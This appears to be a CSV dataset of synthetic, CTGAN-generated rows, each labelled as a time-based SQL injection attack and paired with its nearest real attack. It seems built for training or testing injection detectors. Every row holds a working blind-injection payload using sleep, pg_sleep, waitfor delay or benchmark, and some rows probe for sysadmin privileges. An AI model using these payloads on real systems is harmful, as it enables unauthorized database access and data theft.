id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000176,attack,time,1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #,nearest_attack_euclidean,R000074,6.158253342306764
CTGAN_000177,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,7.903481070416467
CTGAN_000178,attack,time,1  )   waitfor delay '0:0:5' and   (  2993  =  2993,nearest_attack_euclidean,R000205,6.616996599786087
CTGAN_000179,attack,time,1   )    )    as ewlg where 3722  =  3722 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000276,7.756905203936165
CTGAN_000180,attack,time,1'   )    )    as yqcl where 5026  =  5026 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R000228,6.855528967470468
CTGAN_000181,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,4.729980282285857
CTGAN_000182,attack,time,"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""cjkk"" like ""cjkk",nearest_attack_euclidean,R000261,9.22218268318182
CTGAN_000183,attack,time,1  )   where 8320  =  8320 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000234,6.605078319213402
CTGAN_000184,attack,time,"select sleep  (  5  )   and    (    (     (  ""wucy"" like ""wucy",nearest_attack_euclidean,R000214,6.402341519535022
CTGAN_000185,attack,time,"1%""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000235,8.521623535335902
CTGAN_000186,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,5.884307753356642
CTGAN_000187,attack,time,1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000105,6.563757582866999
CTGAN_000188,attack,time,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'cqwz' like 'cqwz,nearest_attack_euclidean,R000159,8.681324547054622
CTGAN_000189,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,5.630601075955955
CTGAN_000190,attack,time,"1   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  9558  =  9558",nearest_attack_euclidean,R000101,7.570645231439213
CTGAN_000191,attack,time,"1""  )   or sleep  (  5  )   and   (  ""fiag"" like ""fiag",nearest_attack_euclidean,R000239,5.460437018735302
CTGAN_000192,attack,time,"1""   )    )     )   waitfor delay '0:0:5'--",nearest_attack_euclidean,R000223,7.673637565658759
CTGAN_000193,attack,time,"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""cjkk"" like ""cjkk",nearest_attack_euclidean,R000261,4.2660823771125855
CTGAN_000194,attack,time,1'+  (  select mavu where 4276  =  4276 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000115,7.275268022098196
CTGAN_000195,attack,time,1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000165,8.07043150784082
CTGAN_000196,attack,time,1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000105,8.113563371905899
CTGAN_000197,attack,time,1  )   as cwsi where 7360  =  7360 or sleep  (  5  )  #,nearest_attack_euclidean,R000124,8.859742352741502
CTGAN_000198,attack,time,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'ukoc' like 'ukoc,nearest_attack_euclidean,R000227,5.877252652627392
CTGAN_000199,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   -- sztf",nearest_attack_euclidean,R000216,7.293522896269282
CTGAN_000200,attack,time,1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like 'uzhd,nearest_attack_euclidean,R000112,5.066398738514967
CTGAN_000201,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,5.626978888322286
CTGAN_000202,attack,time,1   )    )    rlike sleep  (  5  )   and    (    (   8773  =  8773,nearest_attack_euclidean,R000308,6.307978019034166
CTGAN_000203,attack,time,1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000165,11.848171867151974
CTGAN_000204,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,5.173767377124027
CTGAN_000205,attack,time,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'cqwz' like 'cqwz,nearest_attack_euclidean,R000159,8.228769054326122
CTGAN_000206,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,7.55265862144166
CTGAN_000207,attack,time,waitfor delay '0:0:5' and    (    (   7619  =  7619,nearest_attack_euclidean,R000282,6.32711942338068
CTGAN_000208,attack,time,1'+  (  select ophz where 9158  =  9158 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',nearest_attack_euclidean,R000148,8.163350270021649
CTGAN_000209,attack,time,select sleep  (  5  )   and    (    (   'keoy'  =  'keoy,nearest_attack_euclidean,R000175,7.459715250007562
CTGAN_000210,attack,time,"1""   )    )     )   waitfor delay '0:0:5'--",nearest_attack_euclidean,R000223,8.12094793997562
CTGAN_000211,attack,time,1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000165,8.327524191810397
CTGAN_000212,attack,time,waitfor delay '0:0:5' and    (    (   7619  =  7619,nearest_attack_euclidean,R000282,7.192196479756056
CTGAN_000213,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000242,6.053448660124236
CTGAN_000214,attack,time, (  select   (  case when   (  9856  =  9856  )   then sleep  (  5  )   else 9856*  (  select 9856 from information_schema.character_sets  )   end   )    ) ,nearest_attack_euclidean,R000132,8.602939674871763
CTGAN_000215,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,6.109364779262223
CTGAN_000216,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000304,6.36294754720395
CTGAN_000217,attack,time,"1""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""ipqw"" like ""ipqw",nearest_attack_euclidean,R000186,7.046487459190872
CTGAN_000218,attack,time,select sleep  (  5  )   and    (    (   'keoy'  =  'keoy,nearest_attack_euclidean,R000175,4.866423208018324
CTGAN_000219,attack,time,1   )    )    or sleep  (  5  )   and    (    (   8285  =  8285,nearest_attack_euclidean,R000185,6.710737873380194
CTGAN_000220,attack,time,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'cqwz' like 'cqwz,nearest_attack_euclidean,R000159,7.3224681598805885
CTGAN_000221,attack,time,1  )   as hlcn where 1165  =  1165 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000153,5.857372299199446
CTGAN_000222,attack,time,1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000206,5.935306119431732
CTGAN_000223,attack,time,1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000244,6.658031696012694
CTGAN_000224,attack,time,select sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000193,6.868832896200536
CTGAN_000225,attack,time,select sleep  (  5  )   and    (    (   3404  =  3404,nearest_attack_euclidean,R000283,6.745544009479804
CTGAN_000226,attack,time,"1""   )    )     )   waitfor delay '0:0:5'--",nearest_attack_euclidean,R000223,7.054412988831872
CTGAN_000227,attack,time,1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000244,10.465222908967563
CTGAN_000228,attack,time,1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000165,10.28605423626653
CTGAN_000229,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000114,5.697034467406185
CTGAN_000230,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R000279,6.56128421582568
CTGAN_000231,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000138,7.701053339067209
CTGAN_000232,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""vcvb"" like ""vcvb",nearest_attack_euclidean,R000274,5.163335730254064
CTGAN_000233,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,5.944566117954766
CTGAN_000234,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000310,5.875093735470194
CTGAN_000235,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,5.7778939650830585
CTGAN_000236,attack,time,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'ukoc' like 'ukoc,nearest_attack_euclidean,R000227,6.087263208865583
CTGAN_000237,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,7.287843456234555
CTGAN_000238,attack,time,1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  ',nearest_attack_euclidean,R000085,6.293884609941931
CTGAN_000239,attack,time,1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000244,4.728811267220768
CTGAN_000240,attack,time,1 where 8921  =  8921 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R000163,5.737323445512547
CTGAN_000241,attack,time,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000288,7.290708981160533
CTGAN_000242,attack,time,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000288,5.860092561591158
CTGAN_000243,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,6.760489606899834
CTGAN_000244,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000114,6.059829973724724
CTGAN_000245,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'jiio' like 'jiio,nearest_attack_euclidean,R000230,9.160644339158734
CTGAN_000246,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""mfro"" like ""mfro",nearest_attack_euclidean,R000268,4.942916905522455
CTGAN_000247,attack,time,1' rlike sleep  (  5  )   and 'gtfo'  =  'gtfo,nearest_attack_euclidean,R000301,6.612981861447785
CTGAN_000248,attack,time,1' in boolean mode  )   waitfor delay '0:0:5'#,nearest_attack_euclidean,R000166,7.353531051704907
CTGAN_000249,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,6.51253166962409
CTGAN_000250,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000134,8.198288967581451
CTGAN_000251,attack,time,1' in boolean mode  )   and sleep  (  5  )  #,nearest_attack_euclidean,R000303,7.771686014281809
CTGAN_000252,attack,time,1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000244,7.355363389435268
CTGAN_000253,attack,time,1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ayol'  =  'ayol,nearest_attack_euclidean,R000184,6.36730028273438
CTGAN_000254,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,9.127472361839354
CTGAN_000255,attack,time,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'xwsb'  =  'xwsb",nearest_attack_euclidean,R000147,5.773940393295091
CTGAN_000256,attack,time,"1""   )    )    rlike sleep  (  5  )   and    (    (   ""ahhx"" like ""ahhx",nearest_attack_euclidean,R000272,7.566525676659456
CTGAN_000257,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,5.270129382072156
CTGAN_000258,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,5.320171525034061
CTGAN_000259,attack,time,"1""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""dplf"" like ""dplf",nearest_attack_euclidean,R000280,6.637628486971126
CTGAN_000260,attack,time,1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000165,8.17835362937931
CTGAN_000261,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000242,8.206905178847316
CTGAN_000262,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000127,6.161001467263669
CTGAN_000263,attack,time,"1""   )    )    rlike sleep  (  5  )   and    (    (   ""ahhx"" like ""ahhx",nearest_attack_euclidean,R000272,5.4107188666707
CTGAN_000264,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000114,6.456004538328063
CTGAN_000265,attack,time,1   )    )    rlike sleep  (  5  )   and    (    (   8773  =  8773,nearest_attack_euclidean,R000308,5.812889282245311
CTGAN_000266,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""vcvb"" like ""vcvb",nearest_attack_euclidean,R000274,8.240723056358178
CTGAN_000267,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,5.927514096314
CTGAN_000268,attack,time,1'+  (  select echl where 6593  =  6593 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000169,7.259263737951758
CTGAN_000269,attack,time,1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000105,5.070626648989185
CTGAN_000270,attack,time,1%' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000297,6.842258951730681
CTGAN_000271,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000264,6.371841563064897
CTGAN_000272,attack,time,1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000165,8.54924861386083
CTGAN_000273,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb",nearest_attack_euclidean,R000211,5.134515837425592
CTGAN_000274,attack,time,1'  )   where 7908  =  7908 or sleep  (  5  )  --,nearest_attack_euclidean,R000103,7.564540211209715
CTGAN_000275,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   1476  =  1476,nearest_attack_euclidean,R000238,7.107947038615573
CTGAN_000276,attack,time,1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,nearest_attack_euclidean,R000089,4.6729792728462165
CTGAN_000277,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,5.968134264176159
CTGAN_000278,attack,time,1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  ',nearest_attack_euclidean,R000085,8.228629533951732
CTGAN_000279,attack,time,select sleep  (  5  )   and   (  'dcys' like 'dcys,nearest_attack_euclidean,R000135,4.496632729176941
CTGAN_000280,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,4.885331182489773
CTGAN_000281,attack,time,1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #,nearest_attack_euclidean,R000074,6.020911684987229
CTGAN_000282,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,7.069396590723873
CTGAN_000283,attack,time,"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""cjkk"" like ""cjkk",nearest_attack_euclidean,R000261,6.9637094717217645
CTGAN_000284,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000242,4.6229007376102516
CTGAN_000285,attack,time,1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000165,7.341527963178173
CTGAN_000286,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'jiio' like 'jiio,nearest_attack_euclidean,R000230,5.507203739956144
CTGAN_000287,attack,time,"select pg_sleep  (  5  )   and   (  ""pjql"" like ""pjql",nearest_attack_euclidean,R000161,5.707694805308622
CTGAN_000288,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,6.954906087216859
CTGAN_000289,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000242,6.2908728650555075
CTGAN_000290,attack,time,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000306,7.878746870312434
CTGAN_000291,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000264,7.094923589943778
CTGAN_000292,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000264,5.814612627237403
CTGAN_000293,attack,time,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'cqwz' like 'cqwz,nearest_attack_euclidean,R000159,7.196804374908653
CTGAN_000294,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000242,5.135842591818836
CTGAN_000295,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000114,6.543671127853244
CTGAN_000296,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,4.574655470247246
CTGAN_000297,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,10.50308236037542
CTGAN_000298,attack,time,"select sleep  (  5  )   and   (  ""innk""  =  ""innk",nearest_attack_euclidean,R000219,6.165535081490221
CTGAN_000299,attack,time,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000288,5.1240873425559235
CTGAN_000300,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000242,4.9354854880213574
CTGAN_000301,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000304,6.193420068050244
CTGAN_000302,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,6.214390695339299
CTGAN_000303,attack,time,1   )    )    as msug where 3503  =  3503 and sleep  (  5  )  #,nearest_attack_euclidean,R000201,5.350533737537984
CTGAN_000304,attack,time,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'cqwz' like 'cqwz,nearest_attack_euclidean,R000159,7.797673709473611
CTGAN_000305,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,6.375476618533013
CTGAN_000306,attack,time,1' in boolean mode  )   and sleep  (  5  )  #,nearest_attack_euclidean,R000303,6.035208898550891
CTGAN_000307,attack,time,1 where 8921  =  8921 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R000163,5.21901984767922
CTGAN_000308,attack,time,1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000165,6.789961073536258
CTGAN_000309,attack,time,"1%' or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000284,8.568422022121881
CTGAN_000310,attack,time,1   )    )    as ewlg where 3722  =  3722 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000276,5.648857223999883
CTGAN_000311,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000264,7.696557046621792
CTGAN_000312,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,5.749743340045404
CTGAN_000313,attack,time,"1""   )    )    rlike sleep  (  5  )   and    (    (   ""ahhx"" like ""ahhx",nearest_attack_euclidean,R000272,7.090500883093735
CTGAN_000314,attack,time,1   )    )    rlike sleep  (  5  )   and    (    (   8773  =  8773,nearest_attack_euclidean,R000308,6.140245061395024
CTGAN_000315,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,5.728557536501668
CTGAN_000316,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000071,5.316314194513374
CTGAN_000317,attack,time, (  select   (  case when   (  9856  =  9856  )   then sleep  (  5  )   else 9856*  (  select 9856 from information_schema.character_sets  )   end   )    ) ,nearest_attack_euclidean,R000132,10.747806965027445
CTGAN_000318,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000242,9.475382086509526
CTGAN_000319,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,7.064671492875415
CTGAN_000320,attack,time,"1'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  'tpeo' like 'tpeo",nearest_attack_euclidean,R000217,7.070407907771672
CTGAN_000321,attack,time,1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000105,5.232899805529173
CTGAN_000322,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000310,6.654641994929529
CTGAN_000323,attack,time,1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000206,5.557512160469864
CTGAN_000324,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,6.523440093943222
CTGAN_000325,attack,time,"1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000066,8.136441056513165
CTGAN_000326,attack,time,1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,nearest_attack_euclidean,R000089,4.627488481934562
CTGAN_000327,attack,time,1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000165,7.697609020068467
CTGAN_000328,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,6.608702328688168
CTGAN_000329,attack,time,select sleep  (  5  )   and    (    (   3404  =  3404,nearest_attack_euclidean,R000283,6.096107874237622
CTGAN_000330,attack,time,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000288,6.610473120259418
CTGAN_000331,attack,time,"1""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000226,6.428738300309225
CTGAN_000332,attack,time,1   )    )    as msug where 3503  =  3503 and sleep  (  5  )  #,nearest_attack_euclidean,R000201,7.311054740180943
CTGAN_000333,attack,time,"1""  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  ""vxec"" like ""vxec",nearest_attack_euclidean,R000277,9.44253387963512
CTGAN_000334,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000304,6.32958238584343
CTGAN_000335,attack,time,1'+  (  select 'dkxk' where 1241  =  1241 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000299,7.283327158052663
CTGAN_000336,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,9.359464455991743
CTGAN_000337,attack,time,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'cqwz' like 'cqwz,nearest_attack_euclidean,R000159,9.467970722211552
CTGAN_000338,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000310,6.135634206611523
CTGAN_000339,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.129062370076527
CTGAN_000340,attack,time,1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000244,7.736457629480639
CTGAN_000341,attack,time,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'cqwz' like 'cqwz,nearest_attack_euclidean,R000159,5.271490513075634
CTGAN_000342,attack,time,1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000165,11.145254808243408
CTGAN_000343,attack,time,"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000038,6.524217692711969
CTGAN_000344,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,6.812333611933607
CTGAN_000345,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,6.1028964841010875
CTGAN_000346,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and 'obwn'  =  'obwn,nearest_attack_euclidean,R000285,7.015969474368091
CTGAN_000347,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000242,6.42389541376724
CTGAN_000348,attack,time,1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000206,6.604203104916184
CTGAN_000349,attack,time,1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000165,6.584273952795964
CTGAN_000350,attack,time,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'cqwz' like 'cqwz,nearest_attack_euclidean,R000159,5.823674786370387
CTGAN_000351,attack,time,1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000244,5.00700755753909
CTGAN_000352,attack,time,1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000165,7.00185983861737
